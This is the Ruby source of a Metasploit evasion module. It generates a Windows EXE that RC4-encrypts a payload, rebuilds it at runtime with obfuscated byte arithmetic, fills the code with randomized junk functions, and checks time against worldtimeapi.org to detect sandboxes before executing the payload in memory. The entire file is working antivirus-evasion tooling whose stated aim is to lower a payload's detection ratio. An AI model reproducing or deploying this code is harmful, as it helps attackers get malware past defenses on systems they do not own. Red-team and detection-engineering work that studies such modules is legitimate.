##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'metasploit/framework/compiler/windows'

class MetasploitModule < Msf::Evasion

  def initialize(info = {})
    super(
      merge_info(
        info,
        'Name' => 'Time obfuscation no shellcode',
        'Description' => %q{
          This module allows you to generate a Windows EXE without having a shellcode in the file. and rather have it generated at runtime. This is useful for reducing the detection ratio of your payload.
          it will also use few technique to avoid runtime detection such as,
          time obfuscation server_time->sleep->server time again.
          it also generat a lot of junk code to randomise the sum of the code.

          For better result use the payload with a secure channel such as HTTPS to avoid easy network detection.
        },
        'Author' => [ 'Arthur RAOUT@nbs-system' ],
        'License' => MSF_LICENSE,
        'Platform' => 'win',
        'Arch' => ARCH_X86,
        'Targets' => [ ['Microsoft Windows', {}] ]
      )
    )
  end

  def rc4_key
    @rc4_key ||= Rex::Text.rand_text_alpha(32..64)
  end

  def get_payload
    @c_payload ||= lambda {
      opts = { format: 'rc4', key: rc4_key }
      junk = Rex::Text.rand_text(10..1024)
      p = payload.encoded + junk

      return {
        size: p.length,
        hex_format: Msf::Simple::Buffer.transform(p, 'hex', 'buf', opts),
        c_format: Msf::Simple::Buffer.transform(p, 'c', 'buf', opts)
      }
    }.call
  end

  def get_payload_bytes
    payload = get_payload[:hex_format]
    s = ''
    i = 0
    j = 0
    vector = rand(1..999999)
    while j < get_payload[:size]
      s += "  buf[#{j}] = ((char)\'\\x#{((payload[i] + payload[i + 1]).hex + vector).to_s(16).rjust(2, '0')}\'-#{vector});\n"
      if rand(1..100) > 98
        s += junk_code(1)
      end
      i += 2
      j += 1
    end
    return s
  end

  def fill_array(size)
    s = ''
    i = 0
    while i < size
      if i == size - 1
        s += "#{rand(1..1024)}"
      else
        s += "#{rand(1..1024)}, "
      end
      i += 1
    end
    return s
  end

  def junk_code(flag) # if flag is 0 return a function , if flag is 1 return a call to a function
    # fibonnacci fucntion
    fibonnacci = %|
  int fib(int n) {
    if (n <= 1)
      return n;
    return fib(n-1) + fib(n-2);
  }
  |
    bubbel_sort = %|
  void bubbel_sort(int arr[], int n) {
    int i, j, temp;
    for (i = 0; i < n; i++) {
      for (j = 0; j < n - i - 1; j++) {
        if (arr[j] > arr[j + 1]) {
          temp = arr[j];
          arr[j] = arr[j + 1];
          arr[j + 1] = temp;
        }
      }
    }
  }
  |
    euclide = %|
  int euclide(int a, int b) {
    if (a == 0)
      return b;
    return euclide(b % a, a);
  }
  |
    binary_search = %|
  int binary_search(int arr[], int l, int r, int x) {
    if (r >= l) {
      int mid = l + (r - l) / 2;
      if (arr[mid] == x)
        return mid;
      if (arr[mid] > x)
        return binary_search(arr, l, mid - 1, x);
      return binary_search(arr, mid + 1, r, x);
    }
    return -1;
  }
  |
    # fibonnacci call example
    fibonnacci_call = %|
  fib(#{rand(1..15)});
  |
    # bubbel sort call example
    arr_size = rand(1..100)
    arr_name = Rex::Text.rand_text_alpha(5)
    bubbel_sort_call = %|
  int #{arr_name}[#{arr_size}] = {#{fill_array(arr_size)}};
  bubbel_sort(#{arr_name}, #{arr_size});
  |
    # euclide call example
    euclide_call = %|
  euclide(#{rand(1..100)}, #{rand(1..100)});
  |
    # binary search call example
    arr_size = rand(1..100)
    arr_name = Rex::Text.rand_text_alpha(5)
    binary_search_call = %|
  int #{arr_name}[#{arr_size}] = {#{fill_array(arr_size)}};
  binary_search(#{arr_name}, 0, #{arr_size - 1}, #{rand(1..100)});
  |
    if flag == 0
      return [fibonnacci, bubbel_sort, euclide, binary_search].shuffle
    else
      return [fibonnacci_call, bubbel_sort_call, euclide_call, binary_search_call].sample
    end
  end

  def get_includes
    rc4 = "#include \"#{File.join(Msf::Config.install_root, 'data', 'headers', 'windows')}/rc4.h\""
    includes = ["#include <windows.h>\n", "#include <psapi.h>\n", "#include <wininet.h>\n", "#include <synchapi.h>\n", "#include <stdio.h>\n", rc4, "#include <time.h>\n", "#include <stdlib.h>\n", "#include <string.h>\n", '#include <winsock2.h>']
    includes.shuffle
    return includes.join
  end

  def get_time_distorsion
    time_distorsion = %|

  int extractField(const char *response, const char *fieldName, int *fieldValue) {
    const char *delimiter = "\\n";
    char *token;

    token = strtok((char *)response, delimiter);

    while (token != NULL) {
        if (strstr(token, fieldName)) {
            if (sscanf(token, "%*[^:]: %d", fieldValue) == 1) {
  #{junk_code(1)}
                return 1;
            } else {
  #{junk_code(1)}
                return 0;
            }
        }
  #{junk_code(1)}

        token = strtok(NULL, delimiter);
    }

    return 0;
  }

  int get_time()
  {
    const char *hostname = "worldtimeapi.org";
    const int port = 80;
    const char *path = "/api/timezone/Europe/London.txt";

     WSADATA wsaData;
  #{junk_code(1)}
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        return EXIT_FAILURE;
    }

    struct hostent *host_info = gethostbyname(hostname);
    if (host_info == NULL) {
        WSACleanup();
        exit(EXIT_FAILURE);
    }

    int client_socket = socket(AF_INET, SOCK_STREAM, 0);
    if (client_socket == -1) {
        WSACleanup();
        exit(EXIT_FAILURE);
    }

    struct sockaddr_in server_address;
    server_address.sin_family = AF_INET;
  #{junk_code(1)}
    server_address.sin_port = htons(port);
    memcpy(&server_address.sin_addr, host_info->h_addr_list[0], host_info->h_length);

    if (connect(client_socket, (struct sockaddr *)&server_address, sizeof(server_address)) == -1) {
        close(client_socket);
        WSACleanup();
        exit(EXIT_FAILURE);
    }

    const char *request_template = "GET %s HTTP/1.1\\r\\nHost: %s\\r\\nConnection: close\\r\\n\\r\\n";
    char request[4096];
    snprintf(request, sizeof(request), request_template, path, hostname);

    if (send(client_socket, request, strlen(request), 0) == -1) {
        close(client_socket);
        WSACleanup();
        exit(EXIT_FAILURE);
    }

    char response[4096];
    ssize_t received_bytes;

  #{junk_code(1)}
    while ((received_bytes = recv(client_socket, response, sizeof(response) - 1, 0)) > 0) {
        response[received_bytes] = '\0';
    }

    int unixtime;
    extractField(response, "unixtime", &unixtime);
  #{junk_code(1)}
    close(client_socket);
    WSACleanup();
    return unixtime;
  }

  int time_distortion() {
    int unixtime = get_time();
    sleep(10);
  #{junk_code(1)}
    int unixtime2 = get_time();
    int diff = unixtime2 - unixtime;
    if( diff < 11 )
       exit(1);
    else
      return (1);
  #{junk_code(1)}
    return 0;
  }
  |
  end

  def c_template
    @c_template ||= %|


#{get_includes}


#{junk_code(0).join}


#{get_time_distorsion}

int main(int argc, char **argv)
{


  if (time_distortion() == 0)
    exit(1);
  int size  = #{get_payload[:size]};
  char buf[#{get_payload[:size]}];
  int lpBufSize = sizeof(int) * size;
  #{junk_code(1)}
  LPVOID lpBuf = _malloca(lpBufSize);
  #{junk_code(1)}
  memset(lpBuf, '\\0', lpBufSize);
  #{get_payload_bytes}

  #{junk_code(1)}
  RC4("#{rc4_key}", buf, (char*) lpBuf, size);
  #{junk_code(1)}
    void (*func)();
  #{junk_code(1)}
    func = (void (*)()) lpBuf;
  #{junk_code(1)}
  printf("Running payload\\n");
    (void)(*func)();
  #{junk_code(1)}
    return 0;
  #{junk_code(1)}
}|
  end

  def run
    fname = Rex::Text.rand_text_alpha(4..7)
    path = File.join(Msf::Config.local_directory, fname)
    full_path = ::File.expand_path(path)
    m = Metasploit::Framework::Compiler::Mingw::X86.new({ show_compile_cmd: true, f_name: full_path, compile_options: ' -lpsapi -lwininet -lwinmm -lws2_32 -w ' })
    output = m.compile_c(c_template)
    if output.length > 0
      print_error(output)
    else
      print_good "#{fname}.exe stored at #{full_path}.exe"
    end
    print_good "#{fname}.c stored at #{full_path}.c"
  end

end
